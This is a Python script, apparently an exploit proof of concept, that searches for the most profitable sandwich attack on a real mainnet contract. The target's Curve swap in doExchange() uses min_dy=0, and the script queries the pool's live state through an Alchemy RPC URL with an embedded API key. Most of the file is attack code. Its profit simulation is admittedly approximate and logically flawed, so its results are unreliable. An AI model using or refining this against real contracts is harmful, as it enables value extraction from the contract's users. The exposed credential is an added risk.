#!/usr/bin/env python3
"""Compute optimal sandwich attack parameters for ExchangeBetweenPools.doExchange().

The vulnerability: curve.exchange_underlying(1, 2, camount, 0) uses min_dy=0.
An attacker can sandwich the swap for profit.

We simulate:
1. Front-run: swap USDC->USDT to move price
2. Victim: doExchange swaps USDC->USDT at worse rate
3. Back-run: swap USDT->USDC at improved rate
"""

import subprocess
import json

RPC = "https://eth-mainnet.g.alchemy.com/v2/YB8p9sQb6OE4_ZXJP1I5W"
CURVE_POOL = "0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51"
FROM_BANK = "0x9Ab872A34139015Da07EE905529a8842a6142971"

def call(contract, sig, *args):
    cmd = ["cast", "call", contract, sig, *[str(a) for a in args], "--rpc-url", RPC]
    result = subprocess.run(cmd, capture_output=True, text=True)
    return result.stdout.strip()

def get_dy(i, j, dx):
    """Get expected output dy for swapping dx from coin i to coin j"""
    result = call(CURVE_POOL, "get_dy(int128,int128,uint256)(uint256)", i, j, dx)
    return int(result)

def get_balances():
    """Get pool balances for coins 1 (USDC) and 2 (USDT)"""
    b1 = int(call(CURVE_POOL, "balances(int128)(uint256)", 1))
    b2 = int(call(CURVE_POOL, "balances(int128)(uint256)", 2))
    return b1, b2

def main():
    # Get current pool state
    b1, b2 = get_balances()
    print(f"Pool USDC balance: {b1}")
    print(f"Pool USDT balance: {b2}")
    print(f"Pool USDC (human): {b1 / 1e6:.2f} USDC")
    print(f"Pool USDT (human): {b2 / 1e6:.2f} USDT")
    print()

    # Get base exchange rate (no manipulation)
    test_amount = 100_000_000  # 100 USDC
    base_dy = get_dy(1, 2, test_amount)
    print(f"Base rate: {test_amount} USDC -> {base_dy} USDT")
    print(f"Base rate (human): {test_amount/1e6:.2f} USDC -> {base_dy/1e6:.6f} USDT")
    print(f"Effective rate: {base_dy / test_amount:.6f}")
    print()

    # The optimal sandwich attack: 
    # The attacker front-runs by swapping USDC->USDT, making USDT cheaper
    # Then doExchange swaps at the worse rate
    # Then attacker back-runs by swapping USDT->USDC at the improved rate
    #
    # For a stablecoin pool, the attack is less profitable but still possible
    # if the pool is imbalanced.
    
    # Since the pool is currently showing abnormal rates, let's check a range
    # of front-run amounts to find optimal profit
    
    victim_amount = 100_000_000  # 100 USDC (assumed victim amount)
    
    print("=== Sandwich Attack Simulation ===")
    print(f"Victim swap amount: {victim_amount/1e6:.2f} USDC")
    print()
    
    best_profit = 0
    best_front = 0
    
    for front_mult in [0.1, 0.5, 1, 2, 5, 10, 20, 50, 100]:
        front_amount = int(victim_amount * front_mult)
        if front_amount <= 0:
            continue
        
        # Front-run: attacker swaps USDC -> USDT
        # This pushes USDT price down (more USDT per USDC)
        front_dy = get_dy(1, 2, front_amount)
        
        # Victim swap after front-run (approximate - the pool state changed)
        # We approximate by computing with adjusted balances
        # But since we can't easily simulate the exact post-front-run state,
        # we use the current get_dy as an approximation
        # In reality, the victim gets worse rate after front-run
        
        # Simplified: compute victim dy at current state 
        # (actual would be worse due to front-run moving the price)
        victim_dy = get_dy(1, 2, victim_amount)
        
        # Back-run: attacker swaps USDT -> USDC
        # After the victim swap, USDT is cheaper, so attacker gets more USDC
        back_dy = get_dy(2, 1, victim_dy + front_dy)
        
        # Attacker profit = back_dy - (front_amount + victim_amount they would have gotten)
        # Simplified: attacker put front_amount USDC, got front_dy USDT
        # Then put front_dy + victim_dy USDT, got back_dy USDC
        # Profit = back_dy - front_amount (in USDC terms, minus the victim_dy which wasn't theirs)
        
        # Actually: attacker's net = back_dy * (front_dy / (front_dy + victim_dy)) - front_amount
        # This accounts for only getting back their share of the USDT
        attacker_usdt_share = front_dy
        total_usdt = front_dy + victim_dy
        if total_usdt > 0:
            back_usdc_for_attacker = int(back_dy * attacker_usdt_share / total_usdt)
        else:
            back_usdc_for_attacker = 0
        
        profit = back_usdc_for_attacker - front_amount
        
        print(f"Front {front_amount/1e6:.2f} USDC -> {front_dy/1e6:.2f} USDT | "
              f"Victim {victim_amount/1e6:.2f} USDC -> {victim_dy/1e6:.2f} USDT | "
              f"Profit: {profit/1e6:.6f} USDC")
        
        if profit > best_profit:
            best_profit = profit
            best_front = front_amount
    
    print()
    print(f"Best front-run amount: {best_front/1e6:.2f} USDC")
    print(f"Best profit: {best_profit/1e6:.6f} USDC")

if __name__ == "__main__":
    main()
